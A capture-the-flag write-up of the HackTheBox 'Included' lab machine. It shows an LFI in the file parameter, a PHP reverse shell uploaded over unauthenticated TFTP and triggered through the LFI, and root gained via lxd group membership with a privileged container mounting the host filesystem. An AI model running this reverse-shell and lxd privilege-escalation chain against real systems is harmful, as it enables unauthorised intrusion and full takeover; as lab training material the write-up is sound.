---
title: "HackTheBox - Included"
author: Nasrallah
description: ""
date: 2022-07-17 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, udp, ftp, lfi, lxd]
img_path: /assets/img/hackthebox/machines/included/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Included](https://app.hackthebox.com/starting-point?tier=2) from [HackTheBox](https://www.hackthebox.com). The target is running a webserver on port 80 and a TFTP server on udp port 69 which is unusual. The webpage is vulnerable to lfi, and the tftp server requires no authentication. We upload a reverse shell to the tftp server and request it using the lfi to get access to the target. After that we find some credentials in one of the  web files that belongs to a user named `mike`. That user is part of a group called `lxd`, and we find a way to escalate privilege with that. 

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.95.185 (10.129.95.185)
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php
```

Found port 80 open running Apache.

Let's run another scan but this time, we scan UDP ports. `sudo nmap -sU -T4 {target_IP}`

>This take a very long time.

```terminal
Nmap scan report for 10.129.95.185 (10.129.95.185)
Host is up (0.080s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE
69/udp open|filtered tftp
```

We have port 69 open running `tftp`.

### Web

Let's navigate to the webpage.

![](1.png)

Nothing really interesting here, but if we take a look at the URL `http://10.129.95.185/?file=home.php` we see that the website is including resources from the system(home.php) via the parameter `file`, and this might be vulnerable to LFI(**L**ocal **F**ile **I**nclusion).

### LFI

Let's see if we can read the `/etc/passwd` file by including it in the file parameter: `http://10.129.95.185/?file=/etc/passwd`.

![](2.png)

We now confirmed that the website is vulnerable to LFI.

### TFTP

We found earlier that TFTP server is running on udp port 69. We can connect to that service but first we need to install it on our machine.

```terminal
sudo apt install tftp
```

By default, TFTP needs no authentication. We can connect to it like so `tftp {target_ip}`.

![](3.png)


## **Foothold**

From the help menu, we see the command `put` that gives us the ability to upload file to the server.

We can upload a reverse shell and then request it using the LFI to get a shell. We can use this one [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

>Change the ip in the code to you tun0 ip.

From the same directory of the reverse shell file, connect to the TFTP server and upload the file using `put reverse.php`.

![](4.png)

Now run a listener `nc -lvnp 1234`

The next thing we need to know is the path of the file we just uploaded. A quick search on google we get the path of the TFTP server.

![](5.png)

Great! Now go the the browser and request the file. `http://10.129.95.185/?file=/var/lib/tftpboot/reverse.php`.

![](6.png)

Got the reverse shell. I then stabilized my shell with the following commands.

```terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
 
**ctrl + z**

stty raw -echo;fg
```

![](7.png)


## **Privilege Escalation**

Searching in the webserver's directory, i found a password for user `mike` in on the files.

![](8.png)

Let's change the user to mike `su mike`.

![](9.png)

After running the command `id`, we notice that mike is part of a group named `lxd`.

Searching on google for lxd privilege escalation, found this useful [article](https://www.hackingarticles.in/lxd-privilege-escalation/) that provides us with the following guided steps to follow.

 1. Steps to be performed on the attacker machine:
    - Download build-alpine in your local machine through the git repository.
    - Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
    - Transfer the tar file to the target machine.
 
 2. Steps to be performed on the target machine:
    - Download the alpine image.
    - Import image for lxd.
    - Initialize the image inside a new container.
    - Mount the container inside the /root directory.


Let's get started by cloning the git repo.

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
```

Then we need to build the image by running `sudo ./build-alpine`

![](10.png)

The above command has created a tar file that we need to upload to the target using python http server.

```bash
sudo python3 -m http.server 80
```

![](11.png)

Now we go to the target machine and request the file.

```bash
wget http://10.10.10.10/alpine-v3.16-x86_64-20220803_1751.tar.gz
```

![](12.png)

Now we add the image to the LXD as follows:

```bash
lxc image import ./alpine-v3.16-x86_64-20220803_1751.tar.gz --alias myimage
```

let's check the list of images.

```bash
lxc image list
```

![](13.png)

Great! We can see that our image is there.

We now need to run the following list of commands that would give us access to root.

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

![](14.png)

Great! We got a root shell. But to see all the resources of the target machine, navigate to `/mnt/root`

![](15.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
